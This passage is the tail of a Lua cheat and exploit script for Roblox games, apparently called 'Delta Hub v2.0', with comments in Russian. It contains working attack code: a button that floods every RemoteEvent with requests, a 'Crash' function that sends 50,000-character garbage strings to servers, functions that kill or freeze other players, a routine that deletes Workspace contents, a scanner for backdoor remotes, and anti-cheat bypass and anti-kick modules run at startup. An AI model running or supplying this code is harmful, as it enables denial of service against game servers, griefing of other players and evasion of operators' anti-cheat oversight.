        print("[BACKDOORS]")
        for _, r in ipairs(bd) do
            print("  " .. r:GetFullName())
        end
    end)
    GUIModule:CreateButton(execTab, "Заспамить сервер", function()
        for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                spawn(function()
                    for _ = 1, 1000 do
                        pcall(function() remote:FireServer() end)
                    end
                end)
            end
        end
    end)
end

-- ========== РЕИНИЦИАЛИЗАЦИЯ МОДУЛЕЙ ИЗ v1.0 ==========
-- (Базовые модули из первой версии, расширенные)
local PlayerModule = {}
function PlayerModule:Kill(player)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target and target.Character then
        local hum = target.Character:FindFirstChild("Humanoid")
        if hum and hum.Health > 0 then hum.Health = 0 end
    end
end

function PlayerModule:Freeze(player, state)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target and target.Character then
        local root = target.Character:FindFirstChild("HumanoidRootPart")
        if root then root.Anchored = state end
    end
end

function PlayerModule:Crash(player)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target then
        local garbage = string.rep("0", 50000)
        for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                for _ = 1, 100 do
                    pcall(function() remote:FireServer(garbage) end)
                end
            end
        end
    end
end

local WorldModule = {}
function WorldModule:ClearWorkspace()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if not obj:IsA("Camera") and obj.Name ~= "Terrain" then
            pcall(function() obj:Destroy() end)
        end
    end
end

local ESPModule = {Enabled = false, Objects = {}}
function ESPModule:Toggle(state)
    self.Enabled = state ~= nil and state or not self.Enabled
    if not self.Enabled then
        for _, obj in ipairs(self.Objects) do
            pcall(function() obj:Remove() end)
        end
        self.Objects = {}
    end
end

local RemoteExecution = {}
function RemoteExecution:FindBackdoor()
    local patterns = {"exec", "run", "command", "admin", "backdoor", "execute", "cmd", "eval"}
    local found = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local name = string.lower(obj.Name)
            for _, pattern in ipairs(patterns) do
                if string.find(name, pattern) then
                    table.insert(found, obj)
                    break
                end
            end
        end
    end
    return found
end

-- ========== ЗАПУСК ==========
local function Init()
    -- Активируем защиты
    spawn(function() AntiDetectModule:BypassTSUM() end)
    spawn(function() AntiDetectModule:AntiKick() end)
    spawn(function() AntiDetectModule:AntiTeleport() end)
    spawn(function() AntiDetectModule:AntiAFK() end)
    
    -- Сканируем экономику
    spawn(function()
        wait(3)
        EconomyModule:ScanGameEconomy()
    end)
    
    -- Строим GUI
    spawn(function()
        wait(1)
        BuildHub()
    end)
    
    -- Глобальный доступ
    getgenv().DeltaHub = {
        GUI = GUIModule,
        Music = MusicPlayer,
        Economy = EconomyModule,
        Anti = AntiDetectModule,
        Players = PlayerModule,
        World = WorldModule,
        ESP = ESPModule,
        Exec = RemoteExecution,
        Config = CONFIG
    }
    
    print([[
    
    ╔══════════════════════════════════════╗
    ║   DELTA HUB v2.0 ЗАГРУЖЕН          ║
    ║   GUI: RightControl                 ║
    ║   Atlas x VERA | 18 months          ║
    ╚══════════════════════════════════════╝
    
    ]])
end

Init()
